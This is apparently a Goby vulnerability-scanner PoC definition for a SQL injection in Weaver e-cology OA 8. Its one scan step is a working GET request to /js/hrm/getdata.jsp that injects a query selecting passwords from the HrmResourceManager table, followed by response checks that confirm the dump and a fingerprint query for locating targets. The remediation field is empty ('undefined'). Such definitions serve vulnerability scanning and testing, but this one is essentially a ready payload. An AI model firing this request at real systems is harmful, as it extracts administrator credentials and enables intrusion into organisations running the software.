{
      "Name": "Weaver OA 8 SQL injection fanwei-e-cology",
      "Level": "2",
      "Tags": [
            "fanwei-e-cology"
      ],
      "GobyQuery": "app=\"Weaver-OA\"",
      "Description": "There is a SQL injection vulnerability in Pan micro OA V8, through which an attacker can obtain administrator and server privileges",
      "Product": "Weaver OA 8",
      "Homepage": "https://www.weaver.com.cn/",
      "Author": "PeiQi",
      "Impact": "",
      "Recommandation": "<p>undefined</p>",
      "References": [
            "http://wiki.peiqi.tech"
      ],
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager",
                        "follow_redirect": false,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "not contains",
                                    "value": "404 Not Found",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "not contains",
                                    "value": "<html>",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "script",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "PostTime": "2021-04-10 08:00:20",
      "GobyVersion": "1.8.255"
}